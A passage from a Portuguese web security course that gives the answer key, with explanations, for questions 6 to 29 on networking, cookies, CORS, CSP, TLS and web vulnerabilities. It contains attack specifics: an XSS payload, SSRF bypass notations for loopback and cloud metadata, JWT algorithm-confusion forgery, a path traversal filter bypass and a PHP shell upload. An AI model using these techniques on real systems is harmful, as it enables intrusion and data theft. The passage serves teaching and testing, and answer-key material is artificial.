- **Por que a `B` está correta:** Na Camada 4 (Transporte — veja [Seção 1.3](./01a-fundamentos-web-parte1.md#s1-3) e [Seção 4.3](./04-redes-de-computadores.md#s4-3)), o **TCP** (RFC 9293) provê um fluxo de bytes confiável e orientado a conexão: antes de enviar dados da aplicação, executa o *Three-Way Handshake* (`SYN` -> `SYN-ACK` -> `ACK`), numera os bytes (`Sequence Number`), confirma o recebimento (`Acknowledgment Number`), retransmite segmentos perdidos, entrega os dados em ordem estrita e aplica controle de fluxo (*Window Size*) e de congestionamento (cabeçalho mínimo de 20 bytes). O **UDP** (RFC 768) é *connectionless* (sem handshake), opera em regime de melhor esforço (*best-effort*), não garante entrega nem ordem e possui cabeçalho fixo enxuto de apenas **8 bytes** (Porta Origem, Porta Destino, Comprimento e Checksum), sendo ideal para consultas DNS rápidas, streaming em tempo real, VoIP/WebRTC e como base para o protocolo **QUIC** no HTTP/3.
- **Análise das incorretas:**
  - `A`: Ambos operam na Camada 4 (Transporte).
  - `C`: O UDP trafega normalmente na Internet pública (ex.: DNS na porta 53/UDP e HTTP/3 na porta 443/UDP).
  - `D`: Tanto TCP quanto UDP utilizam portas de 16 bits (`0` a `65535`).
  - `E`: É o inverso: HTTP/1.1 e HTTP/2 operam sobre TCP, enquanto o HTTP/3 (RFC 9114) opera sobre QUIC (RFC 9000), que roda sobre UDP.

##### Resolução da Questão 7 — Gabarito: `C`
- **Por que a `C` está correta:** O atributo **`HttpOnly`** na diretiva `Set-Cookie` ([Seção 2.2.5](./02b-devtools-application.md#s2-2-5) e [Seção 2.2.6](./02b-devtools-application.md#s2-2-6)) instrui o navegador a ocultar o cookie de todas as APIs acessíveis via scripts no cliente (como `document.cookie`). Quando um cookie de sessão **não** possui `HttpOnly`, qualquer código JavaScript rodando na página pode lê-lo. Se a aplicação sofrer uma vulnerabilidade de XSS, o atacante injeta um script que lê `document.cookie` e envia o identificador de sessão para um servidor externo, realizando **Session Hijacking** (sequestro de sessão — [Seção 3.14](./03b-vulnerabilidades-parte2.md#s3-14)).
- **Análise das incorretas:**
  - `A`: O atributo que restringe a transmissão do cookie exclusivamente a canais criptografados HTTPS é a flag **`Secure`**, e não `HttpOnly`.
  - `B`: Cookies (com ou sem `HttpOnly`) são enviados normalmente pelo navegador no cabeçalho HTTP `Cookie`.
  - `D`: A expiração do cookie é controlada por `Max-Age` ou `Expires`.
  - `E`: A proteção de cookies contra envio cross-site em ataques de CSRF está relacionada ao atributo **`SameSite`** (e a tokens anti-CSRF), e não ao `HttpOnly`.

##### Resolução da Questão 8 — Gabarito: `A`
- **Por que a `A` está correta:** O **Cross-Site Scripting (XSS)** ([Seção 3.2](./03a-vulnerabilidades-parte1.md#s3-2)) ocorre quando dados não confiáveis entram em uma aplicação web e são renderizados na resposta HTML ou inseridos no DOM via JavaScript sem validação ou codificação contextual (*Output Encoding*) apropriada. O navegador da vítima não consegue distinguir o script injetado pelo atacante do script legítimo da aplicação, executando-o com acesso total ao DOM, `document.cookie` (sem `HttpOnly`), `localStorage`, `sessionStorage` e podendo realizar ações autenticadas em nome da vítima. Divide-se em **XSS Refletido** (payload vem na requisição e reflete na resposta imediata), **XSS Armazenado** (payload é salvo no banco de dados, como em um comentário, atingindo todos os visitantes) e **DOM-Based XSS** (payload é processado inteiramente no cliente entre uma *source* e um *sink* JavaScript).
- **Análise das incorretas:**
  - `B`: Refere-se a **SQL Injection** ([Seção 3.1](./03a-vulnerabilidades-parte1.md#s3-1)).
  - `C`: Refere-se a um ataque de negação de serviço **SYN Flood** na camada de transporte ([Seção 4.3.2](./04-redes-de-computadores.md#s4-3-2)).
  - `D` e `E`: Referem-se a ataques de infraestrutura de rede (IP Spoofing / SSL Stripping), e não a XSS.

##### Resolução da Questão 9 — Gabarito: `D`
- **Por que a `D` está correta:** Na aba **Network > Timing** ([Seção 2.1.6](./02a-devtools-network.md#s2-1-6)), o **TTFB** (*Time To First Byte* — Tempo até o Primeiro Byte), rotulado como **Waiting for server response**, mede o intervalo entre o instante em que o navegador termina de enviar a requisição HTTP (`Request Sent`) e o instante em que recebe o primeiro byte da resposta HTTP do servidor. Ele compreende: (1) a latência de propagação na rede de ida e volta (1 RTT) e (2) o tempo de processamento no servidor (fila do servidor web, lógica de negócio, consultas ao banco de dados, chamadas a microsserviços e montagem dos cabeçalhos de resposta).
- **Análise das incorretas:**
  - `A`: Refere-se ao tempo total de carregamento da página (`Load` / `Finish`).
  - `B`: Refere-se exclusivamente à fase **DNS Lookup**.
  - `C`: Refere-se a métricas de interação do usuário (como INP — *Interaction to Next Paint*).
  - `E`: O download do corpo ocorre na fase posterior, chamada **Content Download**.

##### Resolução da Questão 10 — Gabarito: `E`
- **Por que a `E` está correta:** Conforme a tabela de portas de rede e serviços ([Seção 4.7](./04-redes-de-computadores.md#s4-7)):
  - **`22` (TCP):** SSH (*Secure Shell*) — administração remota criptografada.
  - **`53` (UDP/TCP):** DNS (*Domain Name System*) — resolução de nomes.
  - **`80` (TCP):** HTTP (*Hypertext Transfer Protocol*) — tráfego web em texto claro.
  - **`443` (TCP/UDP):** HTTPS (HTTP sobre TLS em TCP e HTTP/3 sobre QUIC em UDP).
  - **`3306` (TCP):** MySQL / MariaDB — banco de dados relacional.
  - **`3389` (TCP/UDP):** RDP (*Remote Desktop Protocol*) — área de trabalho remota Windows.
  - **`5432` (TCP):** PostgreSQL — banco de dados relacional.
- **Análise das incorretas (`A`, `B`, `C`, `D`):** Todas trocam deliberadamente as portas (lembrando que `20/21` é FTP, `23` é Telnet, `25` é SMTP, `67/68` é DHCP, `110` é POP3, `143` é IMAP, `445` é SMB e `8080` é HTTP alternativo).

---

<a id="s9-5-3"></a>
#### 9.5.3 Resolução Comentada: Múltipla Escolha — Nível Intermediário (Questões 11 a 20)

##### Resolução da Questão 11 — Gabarito: `B`
- **Por que a `B` está correta:** O `localStorage` ([Seção 1.7.3](./01b-fundamentos-web-parte2.md#s1-7-3), [Seção 1.12.4](./01b-fundamentos-web-parte2.md#s1-12-4) e [Seção 2.2.3](./02b-devtools-application.md#s2-2-3)) foi projetado para armazenar estado de interface não sensível e é completamente exposto ao motor JavaScript da origem. Diferentemente de um cookie protegido pela flag `HttpOnly`, qualquer script executado no contexto da página tem leitura livre sobre `window.localStorage`. Se a aplicação tiver um ponto de XSS (ou carregar um script externo comprometido em um ataque de *Supply Chain* sem SRI), o invasor exfiltra todos os tokens salvos no `localStorage` instantaneamente. **[RECOMENDAÇÃO]**: Armazenar tokens de sessão/refresh em cookies `HttpOnly; Secure; SameSite=Strict` (ou `Lax`) ou manter tokens de acesso de curta duração apenas em memória (variáveis JavaScript de escopo fechado, fora do `window` e do Web Storage).
- **Análise das incorretas:**
  - `A` e `D`: O `localStorage` armazena até ~5 MB de texto sem modificar o conteúdo salvo.
  - `C`: O `localStorage` nunca é anexado automaticamente a URLs ou cabeçalhos HTTP pelo navegador.
  - `E`: Ao contrário dos cookies, dados do `localStorage` precisam ser lidos via JS e anexados manualmente (ex.: header `Authorization`), razão pela qual não são enviados automaticamente em um `<form method="POST">` cross-site.

##### Resolução da Questão 12 — Gabarito: `A`
- **Por que a `A` está correta:** No padrão Fetch/CORS ([Seção 1.11.2](./01b-fundamentos-web-parte2.md#s1-11-2) e [Seção 5.10](./05-headers-de-seguranca.md#s5-10)), o cabeçalho `Access-Control-Allow-Origin: *` informa ao navegador que o recurso é público e pode ser lido via código JavaScript (`fetch` ou `XMLHttpRequest`) por páginas de qualquer origem. Contudo, como medida de proteção arquitetural do próprio navegador, a especificação **proíbe** o uso do curinga `*` quando a requisição utiliza credenciais (`credentials: 'include'`, que envia cookies ou cabeçalhos `Authorization`) e a resposta traz `Access-Control-Allow-Credentials: true` ([Seção 5.11](./05-headers-de-seguranca.md#s5-11)). Se o servidor enviar ambos, o navegador bloqueia a entrega da resposta ao JavaScript e registra um erro de CORS na aba **Console**.
- **Análise das incorretas:**
  - `B`: CORS é uma política de controle de leitura cross-origin aplicada pelo navegador, não tendo relação com desativação de TLS.
  - `C`: O curinga `*` jamais autoriza o envio nem a leitura de respostas autenticadas por cookies.
  - `D` e `E`: Requisições *same-origin* já são permitidas pela SOP, e CORS não é uma regra de firewall de rede (Camada 3/4).

##### Resolução da Questão 13 — Gabarito: `D`
- **Por que a `D` está correta:** O **`Content-Security-Policy` (CSP)** ([Seção 5.1](./05-headers-de-seguranca.md#s5-1)) atua como uma poderosa camada de **defesa em profundidade** (*defense-in-depth*). Mesmo que um atacante encontre uma brecha de injeção de HTML/XSS na página, um CSP bem configurado impede que o navegador execute scripts inline não autorizados (`<script>alert(1)</script>`, atributos `onerror=`), bloqueia o carregamento de scripts de domínios externos não autorizados, desabilita `eval()` (por padrão, na ausência de `'unsafe-eval'`), bloqueia plugins legados (`object-src 'none'`), restringe a tag `<base>` (`base-uri 'self'`) e substitui o antigo `X-Frame-Options` com controle granular contra *Clickjacking* (`frame-ancestors 'none'`).
- **Análise das incorretas:**
  - `A`, `B` e `C`: O uso de `*`, `'unsafe-inline'` e `'unsafe-eval'` em `script-src` neutraliza quase toda a proteção contra XSS do CSP.
  - `E`: O CSP atua no navegador sobre recursos da página e não realiza hashing de senhas no banco de dados.

##### Resolução da Questão 14 — Gabarito: `C`
- **Por que a `C` está correta:** Na aba **Network** do Chrome DevTools ([Seção 2.1.2](./02a-devtools-network.md#s2-1-2) e [Seção 2.1.3](./02a-devtools-network.md#s2-1-3)):
  1. **Preserve log** é indispensável ao auditar fluxos de login, logout, OAuth e pagamentos, pois impede que a tabela de requisições seja limpa quando a página recarrega ou sofre redirecionamento (`302 Found` / `window.location`).
  2. **Disable cache** força o navegador a buscar todos os recursos diretamente na rede, ignorando o cache de memória e de disco enquanto o DevTools estiver aberto.
  3. Na caixa **Filter**, o operador `method:POST` exibe apenas requisições HTTP `POST`, e o prefixo de sinal de menos (`-`) funciona como negação lógica: `-domain:cdn.exemplo.test` exclui qualquer requisição cujo domínio corresponda à CDN.
- **Análise das incorretas (`A`, `B`, `D`, `E`):** Desmarcar *Record network log* ou clicar em *Clear* apaga ou interrompe a captura; a caixa de filtro da aba Network não usa o operador JavaScript `&&` (usa espaço entre filtros) e filtrar por `Img` ocultaria a chamada de autenticação.

##### Resolução da Questão 15 — Gabarito: `E`
- **Por que a `E` está correta:** Conforme a especificação de Cookies (RFC 6265bis — veja [Seção 2.2.5](./02b-devtools-application.md#s2-2-5) e [Seção 2.2.6](./02b-devtools-application.md#s2-2-6)):
  - **`SameSite=Strict`:** O cookie **nunca** é enviado em contextos cross-site, nem mesmo quando o usuário clica em um link `<a href="...">` em outro site.
  - **`SameSite=Lax`** (padrão atual do Chrome quando `SameSite` não é especificado): Oferece excelente equilíbrio entre segurança e usabilidade. Bloqueia o envio do cookie em sub-recursos cross-site (`<img>`, `<iframe>`, `fetch()`, `XHR`) e em formulários cross-site `POST` (mitigando a maioria dos ataques de CSRF), mas **permite** o envio do cookie em navegações de nível superior (*top-level navigations*) que utilizem métodos HTTP seguros (`GET`, `HEAD`), como clicar em um link externo.
  - **`SameSite=None`:** Permite o envio do cookie em requisições cross-site (como widgets em `<iframe>` ou APIs em domínios distintos), mas **exige obrigatoriamente** a presença do atributo `Secure` (`SameSite=None; Secure`); caso contrário, o navegador rejeita o cookie.
- **Análise das incorretas (`A`, `B`, `C`, `D`):** Contradizem diretamente as regras de envio de `Strict`, `Lax` e `None`, ou confundem `SameSite` com `HttpOnly`.

##### Resolução da Questão 16 — Gabarito: `A`
- **Por que a `A` está correta:** Na vulnerabilidade de **SQL Injection** ([Seção 3.1](./03a-vulnerabilidades-parte1.md#s3-1)), concatenar variáveis de entrada diretamente na string SQL permite que caracteres especiais (como `'` e `--`) escapem do contexto de dado literal e passem a fazer parte da gramática de controle da linguagem SQL (`OR '1'='1'`, tornando a condição `WHERE` sempre verdadeira e autenticando o invasor sem senha). Quando se utilizam **Prepared Statements** (*Consultas Parametrizadas* / *Parameterized Queries*), o processo no banco de dados ocorre em duas fases estritamente separadas: (1) o banco recebe o *template* SQL (`SELECT ... WHERE email = $1 AND senha_hash = $2`), faz o *parsing* e compila a árvore sintática da consulta; (2) os valores de entrada são enviados separadamente apenas para preencher os *placeholders*, sendo impossível que o conteúdo de `$1` altere a lógica ou adicione novos comandos SQL.
- **Análise das incorretas (`B`, `C`, `D`, `E`):** Porta de rede, TLS, método HTTP ou codificação HTML não impedem a interpretação SQL no banco de dados.

##### Resolução da Questão 17 — Gabarito: `C`
- **Por que a `C` está correta:** Calculando passo a passo o bloco **`192.168.10.64/26`** ([Seção 4.4.3](./04-redes-de-computadores.md#s4-4-3)):
  1. **Prefixo `/26`:** São 26 bits `1` para a rede e $h = 32 - 26 = 6$ bits `0` para hosts no quarto octeto (`11111111.11111111.11111111.11000000`).
  2. **Máscara em decimal pontilhado:**No último octeto, $128 + 64 = 192 \Rightarrow$ **`255.255.255.192`**.
  3. **Tamanho do bloco (salto):** $2^6 = 64$ endereços totais por sub-rede.
  4. **Endereço de Rede** (todos os bits de host iguais a `0`): **`192.168.10.64`**.
  5. **Endereço de Broadcast** (todos os bits de host iguais a `1`, ou seja, $64 + 64 - 1 = 127$): **`192.168.10.127`**.
  6. **Primeiro e Último Host útil:** De **`192.168.10.65`** (`Rede + 1`) até **`192.168.10.126`** (`Broadcast - 1`).
  7. **Total de hosts utilizáveis:** $2^h - 2 = 2^6 - 2 = 64 - 2 =$ **`62` hosts válidos**.
- **Análise das incorretas:** `A` calcula `/25`; `B` calcula `/27`; `D` calcula `/28`; `E` erra o endereço de broadcast (`.128` já é a próxima sub-rede) e esquece de subtrair os 2 endereços reservados (Rede e Broadcast).

##### Resolução da Questão 18 — Gabarito: `B`
- **Por que a `B` está correta:** O trecho reúne duas falhas clássicas de segurança em JavaScript ([Seção 1.8.3](./01b-fundamentos-web-parte2.md#s1-8-3), [Seção 1.9.1](./01b-fundamentos-web-parte2.md#s1-9-1) e [Seção 2.3.5](./02c-devtools-console.md#s2-3-5)):
  1. **DOM-Based XSS:** A propriedade `window.location.search` é uma **fonte (*source*)** controlada externamente (qualquer link malicioso pode definir os parâmetros da URL). Ao atribuir esse valor diretamente a `element.innerHTML` — que é um **sumidouro (*sink*)** de interpretação de HTML —, um payload como `?q=<img src=x onerror=alert(document.domain)>` será parseado como elemento DOM e executará o script no evento `onerror`. **[REQUISITO]**: Para exibir texto puro, deve-se usar **`textContent`** (ou `innerText`), que insere os caracteres literalmente sem criar nós HTML.
  2. **Uso inseguro de `eval()`:** A função `eval()` compila e executa qualquer string como código JavaScript com privilégios totais na página. Passar um parâmetro da URL para `eval()` permite execução imediata de código arbitrário. Além disso, regras de negócio críticas (como cálculo de descontos) devem ser processadas e validadas obrigatoriamente no **servidor back-end**.
- **Análise das incorretas (`A`, `C`, `D`, `E`):** `document.write` é outro *sink* perigoso de XSS, e o navegador jamais sanitiza `location.search` para uso em `eval()` ou `innerHTML`.

##### Resolução da Questão 19 — Gabarito: `D`
- **Por que a `D` está correta:** Revisando a arquitetura de redes ([Seção 4.1](./04-redes-de-computadores.md#s4-1) e [Seção 4.5](./04-redes-de-computadores.md#s4-5)):
  - **Camada 1 (Física):** PDU = *Bits* (cabos, fibra, rádio).
  - **Camada 2 (Enlace de Dados):** PDU = *Quadro* (*Frame*), endereçamento físico **MAC** (48 bits), equipamento típico = *Switch* L2.
  - **Camada 3 (Rede):** PDU = *Pacote* (*Packet*), endereçamento lógico **IP** (IPv4/IPv6), equipamento típico = *Roteador*.
  - **Camada 4 (Transporte):** PDU = *Segmento* (no TCP) ou *Datagrama* (no UDP), endereçamento por portas lógicas.
  - **Camadas 5, 6 e 7 (Sessão, Apresentação e Aplicação):** PDU = *Dados* (*Data* / Mensagem).
  - O protocolo **ARP** mapeia um IP conhecido na LAN para seu endereço MAC enviando um *ARP Request* em broadcast (`FF:FF:FF:FF:FF:FF`) e recebendo um *ARP Reply* em unicast. Já o **DHCP** (portas UDP `67`/`68`) aloca IP, máscara, gateway padrão e DNS automaticamente pelo ciclo **DORA**: *DHCP Discover* -> *DHCP Offer* -> *DHCP Request* -> *DHCP Acknowledge*.
- **Análise das incorretas (`A`, `B`, `C`, `E`):** Misturam as camadas do Modelo OSI, trocam as PDUs e confundem ARP com DNS ou DHCP com o handshake TCP.

##### Resolução da Questão 20 — Gabarito: `E`
- **Por que a `E` está correta:** Consolidando o papel de cada um dos 4 headers de segurança ([Seção 5.2](./05-headers-de-seguranca.md#s5-2) a [Seção 5.5](./05-headers-de-seguranca.md#s5-5)):
  1. **`Strict-Transport-Security: max-age=31536000; includeSubDomains` (HSTS — RFC 6797):** Ordena que o navegador converta internamente (`307 Internal Redirect`) qualquer tentativa de acesso `http://` para `https://` naquele domínio e em todos os seus subdomínios durante 1 ano (`31.536.000` segundos) e proíba o usuário de ignorar alertas de certificado inválido.
  2. **`X-Content-Type-Options: nosniff`:** Desativa a adivinhação de tipo MIME (*MIME Sniffing*), impedindo que o navegador execute como script ou renderize como HTML um arquivo enviado por usuário que foi servido como `text/plain` ou `image/png`.
  3. **`X-Frame-Options: DENY`:** Impede que a página seja carregada dentro de `<frame>`, `<iframe>`, `<embed>` ou `<object>` em qualquer site (mesma origem ou origem externa), bloqueando ataques de **Clickjacking** (*UI Redressing* — [Seção 3.12](./03b-vulnerabilidades-parte2.md#s3-12)).
  4. **`Referrer-Policy: strict-origin-when-cross-origin`:** Política padrão moderna recomendada: envia a URL completa (caminho e query string) apenas em requisições *same-origin*; em requisições *cross-origin* seguras (`HTTPS -> HTTPS`), envia somente a origem (`https://loja.test/`); e em caso de downgrade (`HTTPS -> HTTP`), não envia o cabeçalho `Referer`.
- **Análise das incorretas (`A`, `B`, `C`, `D`):** Atribuem funções inexistentes ou opostas aos cabeçalhos listados.


---

<a id="s9-5-4"></a>
#### 9.5.4 Resolução Comentada: Múltipla Escolha — Nível Avançado (Questões 21 a 30)

##### Resolução da Questão 21 — Gabarito: `C`
- **Por que a `C` está correta:** Embora a especificação CORS ([Seção 1.11.3](./01b-fundamentos-web-parte2.md#s1-11-3), [Seção 5.10](./05-headers-de-seguranca.md#s5-10) e [Seção 5.11](./05-headers-de-seguranca.md#s5-11)) proíba o par literal `Access-Control-Allow-Origin: *` + `Access-Control-Allow-Credentials: true`, quando o desenvolvedor escreve um código no servidor que lê `req.headers.origin` e o reflete de volta em `Access-Control-Allow-Origin`, o navegador vê uma origem específica e explícita (ex.: `https://site-malicioso.test`) acompanhada de `Access-Control-Allow-Credentials: true`. Como o cookie de sessão da vítima possui `SameSite=None; Secure`, o navegador anexa o cookie à requisição `fetch(..., { credentials: 'include' })` disparada pelo site do atacante e, ao receber a resposta autorizada pelo servidor, entrega todo o JSON bancário ao script invasor. Note que a flag `HttpOnly` impede apenas a leitura da string do cookie via `document.cookie`, mas **não** impede o uso da sessão pelo navegador nem a leitura da resposta HTTP quando o CORS foi explicitamente liberado com credenciais. Além disso, omitir `Vary: Origin` permite que um cache intermediário (CDN) armazene a resposta com o cabeçalho de uma origem e a entregue para outra.
- **Análise das incorretas (`A`, `B`, `D`, `E`):** Ignoram que a reflexão dinâmica de `Origin` contorna a proibição do curinga `*` e abre leitura autenticada cross-origin para qualquer domínio da Internet.

##### Resolução da Questão 22 — Gabarito: `A`
- **Por que a `A` está correta:** Conforme estudado em **Tokens e JWT** ([Seção 1.7.3](./01b-fundamentos-web-parte2.md#s1-7-3)):
  1. **Ataque do algoritmo `none`:** A RFC 7515 definiu o algoritmo `"none"` para tokens não assinados. Se a biblioteca validadora no back-end confiar cegamente no campo `"alg"` enviado no cabeçalho do próprio token sem exigir uma assinatura válida, um atacante pode forjar qualquer *payload* (ex.: `"role": "admin"`), definir `"alg": "none"` e enviar o token terminando com ponto (`header.payload.`).
  2. **Confusão de Algoritmo (`RS256` $\rightarrow$ `HS256`):** No `RS256` (assimétrico), o servidor **assina** com a chave privada RSA e **verifica** com a chave pública RSA. No `HS256` (simétrico), a mesma string secreta é usada para assinar e verificar. Se o código do servidor passar a chave pública RSA para `jwt.verify(token, publicKey)` sem fixar `algorithms: ['RS256']`, o atacante pode alterar o cabeçalho para `"alg": "HS256"` e assinar o token via HMAC usando o texto da chave pública RSA (que frequentemente é pública em `/jwks.json`); o servidor verificará o HMAC usando a mesma `publicKey` e aceitará o token falsificado!
- **Análise das incorretas (`B`, `C`, `D`, `E`):** `HS256` é simétrico (HMAC + SHA-256); `jwt.decode()` não verifica assinatura; e os *claims* (`exp`, `iss`, `aud`) precisam ser validados obrigatoriamente pelo servidor.

##### Resolução da Questão 23 — Gabarito: `D`
- **Por que a `D` está correta:** Em ataques de **Server-Side Request Forgery (SSRF)** ([Seção 3.4](./03a-vulnerabilidades-parte1.md#s3-4)), validar apenas se a string contém `"localhost"` ou `"127.0.0.1"` é ineficaz porque:
  1. Em ambientes de nuvem (AWS, GCP, Azure, etc.), o serviço de metadados da instância responde no endereço IPv4 Link-Local **`169.254.169.254`** (`http://169.254.169.254/latest/meta-data/iam/security-credentials/`), que não passa pela *blocklist*.
  2. Outros serviços internos rodam nas faixas privadas da RFC 1918 (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`).
  3. O parser de URL e a pilha de rede aceitam notações alternativas para o loopback: IPv6 `[::1]`, inteiro decimal `2130706433`, hexadecimal `0x7f000001`, octal `0177.0.0.1`, abreviado `127.1` ou `0.0.0.0`.
  4. Com `allow_redirects=True`, o atacante fornece `https://seu-dominio.test/avatar.png` (que passa no filtro) e seu servidor responde com `302 Found` apontando `Location: http://169.254.169.254/...`.
  5. Com **DNS Rebinding**, o domínio resolve primeiro para um IP público durante a checagem e, milissegundos depois (TTL zero), resolve para `127.0.0.1` na requisição real.
  - **[REQUISITO]**: Validar esquema (`https`), usar *allowlist* de domínios, resolver o DNS uma única vez e bloquear qualquer IP não público antes de abrir o socket, desativar redirecionamentos (`allow_redirects=False`) e exigir **IMDSv2** na nuvem.
- **Análise das incorretas (`A`, `B`, `C`, `E`):** Desconhecem os vetores clássicos de bypass de SSRF e o funcionamento do serviço de metadados em nuvem.

##### Resolução da Questão 24 — Gabarito: `B`
- **Por que a `B` está correta:** Na aba **Network** ([Seção 2.1.4](./02a-devtools-network.md#s2-1-4), [Seção 2.1.7](./02a-devtools-network.md#s2-1-7) e [Seção 2.1.8](./02a-devtools-network.md#s2-1-8)):
  - Tanto o **HTTP/2 (`h2`)** (RFC 9113) quanto o **HTTP/3 (`h3`)** (RFC 9114) implementam **multiplexação** de múltiplos fluxos (*streams*) sobre uma única conexão (mesmo `Connection ID`). Contudo, como o `h2` opera sobre uma única conexão **TCP**, a perda de um único pacote TCP trava a entrega de todos os fluxos daquela conexão até que o pacote seja retransmitido (*Head-of-Line Blocking* de camada de transporte). O `h3` resolve isso operando sobre **QUIC** (RFC 9000) em cima de **UDP**, onde o controle de retransmissão e ordenação é independente por *stream*.
  - Na coluna `Size` (com *Big request rows* ativo), o número superior é o **Transfer Size** (bytes que cruzaram a rede, já comprimidos com Gzip/Brotli somados aos cabeçalhos) e o número inferior é o **Resource Size** (tamanho descomprimido em memória).
- **Análise das incorretas (`A`, `C`, `D`, `E`):** `(memory cache)` e `(disk cache)` atendem à requisição localmente sem tráfego de rede; `h3` exige TLS 1.3 nativo no QUIC; e o *Transfer Size* comprimido é menor que o *Resource Size*.

##### Resolução da Questão 25 — Gabarito: `E`
- **Por que a `E` está correta:** Revisando os mecanismos modernos de isolamento e cookies ([Seção 2.2.5](./02b-devtools-application.md#s2-2-5), [Seção 2.2.8](./02b-devtools-application.md#s2-2-8) e [Seções 5.7 a 5.9](./05-headers-de-seguranca.md#s5)):
  - **Prefixo `__Host-`:** É o contrato mais forte para um cookie (RFC 6265bis). Obriga: (1) flag `Secure`; (2) origem segura HTTPS; (3) `Path=/`; e (4) **ausência total do atributo `Domain`** (*host-only cookie*), impedindo que subdomínios comprometidos sobrescrevam ou leiam o cookie.
  - **CHIPS (`Partitioned`):** Permite cookies cross-site (`SameSite=None; Secure; Partitioned;`) isolados por uma chave dupla (`(top-level site, cookie domain)`), impedindo rastreamento entre sites distintos.
  - **Isolamento Cross-Origin (`window.crossOriginIsolated`):** Exige que o documento principal envie simultaneamente `Cross-Origin-Opener-Policy: same-origin` (**COOP**, isolando a janela de pop-ups cross-origin) e `Cross-Origin-Embedder-Policy: require-corp` (ou `credentialless`, **COEP**, exigindo que sub-recursos cross-origin autorizem o carregamento via **CORP** ou CORS).
- **Análise das incorretas (`A`, `B`, `C`, `D`):** Invertem os requisitos normativos de `__Host-`, `COOP`/`COEP` e `Partitioned`.

##### Resolução da Questão 26 — Gabarito: `B`
- **Por que a `B` está correta:** O código exemplifica de forma didática uma vulnerabilidade de **Race Condition** (*Condição de Corrida*) na categoria **TOCTOU** (*Time-of-Check to Time-of-Use* — [Seção 3.18](./03b-vulnerabilidades-parte2.md#s3-18)). Como a leitura (`SELECT usado`) e a escrita (`UPDATE cupons SET usado = TRUE`) ocorrem em instruções separadas sem bloqueio de linha, quando 20 requisições chegam quase no mesmo microssegundo, as 20 *threads* executam o `SELECT` antes que a primeira execute o `commit()`, todas veem `usado == False` e todas creditam o saldo.
  - **[REQUISITO]**: Para corrigir, a verificação e a alteração de estado devem ser **atômicas** no banco de dados — por exemplo, executando `UPDATE cupons SET usado = TRUE WHERE codigo = %s AND usado = FALSE` e só creditando o saldo se `rowcount == 1`, ou envolvendo a leitura em uma transação com bloqueio pessimista (`SELECT ... FOR UPDATE`).
- **Análise das incorretas (`A`, `C`, `D`, `E`):** Adicionar `sleep()` apenas aumenta a janela da condição de corrida!

##### Resolução da Questão 27 — Gabarito: `D`
- **Por que a `D` está correta:** Analisando as duas rotas ([Seção 3.10](./03b-vulnerabilidades-parte2.md#s3-10), [Seção 3.11](./03b-vulnerabilidades-parte2.md#s3-11) e [Seção 3.17](./03b-vulnerabilidades-parte2.md#s3-17)):
  1. **Rota 1 — Path Traversal (CWE-22):** A função `String.prototype.replace("../", "")` remove apenas a primeira ocorrência (ou, mesmo com regex `/\.\.\//g`, faz apenas uma passagem). Se o atacante enviar `....//`, a remoção do `../` central junta as pontas restantes e forma exatamente `../`! **[REQUISITO]**: Nunca confiar em nomes de arquivos enviados pelo usuário; mapear por ID no banco de dados ou resolver o caminho absoluto canônico (`path.resolve(BASE_DIR, path.basename(input))`) verificando `resolvedPath.startsWith(BASE_DIR + path.sep)`.
  2. **Rota 2 — File Upload Vulnerabilities:** O cabeçalho `Content-Type` (`image/png`) da parte `multipart/form-data` é definido pelo cliente e pode ser trivialmente falsificado enquanto se envia um script `shell.php`. Salvar o arquivo com o nome original dentro do *webroot* permite que o atacante acesse `https://site.test/uploads/shell.php` e execute comandos no sistema operacional (**RCE** — *Remote Code Execution*). **[REQUISITO]**: Validar *magic bytes* e recodificar a imagem, gerar nome aleatório (UUID) com extensão fixa de *allowlist*, armazenar fora do *webroot* (ou em bucket S3 privado/isolado), desabilitar execução de scripts no diretório e servir com `X-Content-Type-Options: nosniff`.
- **Análise das incorretas (`A`, `B`, `C`, `E`):** Confiam em validações no cliente ou em substituições ingênuas de strings.

##### Resolução da Questão 28 — Gabarito: `A`
- **Por que a `A` está correta:** Conforme a **RFC 8446 (TLS 1.3)** e a [Seção 4.6.4](./04-redes-de-computadores.md#s4-6-4):
  - No **TLS 1.2**, o *handshake* exigia **2-RTT** (duas viagens de ida e volta após o TCP handshake) e permitia suítes de cifras legadas vulneráveis (como transporte estático de chave RSA sem Forward Secrecy e modos CBC).
  - No **TLS 1.3**, o cliente já envia suas chaves públicas efêmeras (*key share* ECDHE) na primeira mensagem (`ClientHello`), concluindo a negociação criptográfica em apenas **1-RTT** (com suporte a *0-RTT Resumption* para conexões retomadas, observados os cuidados contra *replay*). Todas as suítes do TLS 1.3 exigem **Forward Secrecy** (via Diffie-Hellman efêmero em curvas elípticas — `ECDHE`) e utilizam exclusivamente cifras **AEAD** (*Authenticated Encryption with Associated Data*), que combinam confidencialidade e integridade em uma única operação (`TLS_AES_128_GCM_SHA256`, `TLS_AES_256_GCM_SHA384`, `TLS_CHACHA20_POLY1305_SHA256`).
  - O **SNI** (*Server Name Indication*) é uma extensão enviada no `ClientHello` indicando o *hostname* desejado para que servidores com IP compartilhado selecionem o certificado digital correto.
- **Análise das incorretas (`B`, `C`, `D`, `E`):** Descrevem incorretamente o número de RTTs, o papel do Forward Secrecy, o SNI e a validação X.509.

##### Resolução da Questão 29 — Gabarito: `C`
- **Por que a `C` está correta:** Na aba **Application** ([Seção 2.2.1](./02b-devtools-application.md#s2-2-1) e [Seção 2.2.7](./02b-devtools-application.md#s2-2-7)), um **Service Worker** atua como um proxy programável em JavaScript no cliente. Se o desenvolvedor programar o evento `fetch` do Service Worker para salvar indiscriminadamente todas as respostas no **Cache Storage** (`caches.open('v1').then(cache => cache.put(req, res))`), até mesmo respostas de APIs autenticadas contendo PII (dados pessoais) e extratos bancários ficarão gravadas em disco no navegador, ignorando o encerramento da sessão no servidor.
  - **Investigação no DevTools:** Verificar **Application > Service Workers** (marcar *Bypass for network* para comparar o comportamento sem o SW) e **Application > Storage > Cache Storage** (inspecionando os JSONs armazenados).
  - **[REQUISITO]**: O Service Worker só deve fazer cache de ativos estáticos públicos (JS, CSS, fontes, imagens públicas), nunca de rotas de API autenticadas ou respostas com `Cache-Control: no-store`. No logout, o front-end deve limpar os caches (`await caches.keys()...`) e o servidor deve responder com `Clear-Site-Data: "cache", "cookies", "storage"`.
- **Análise das incorretas (`A`, `B`, `D`, `E`):** Service Workers exigem HTTPS (ou `localhost`) e o Cache Storage persiste em disco até ser explicitamente removido.

##### Resolução da Questão 30 — Gabarito: `E`
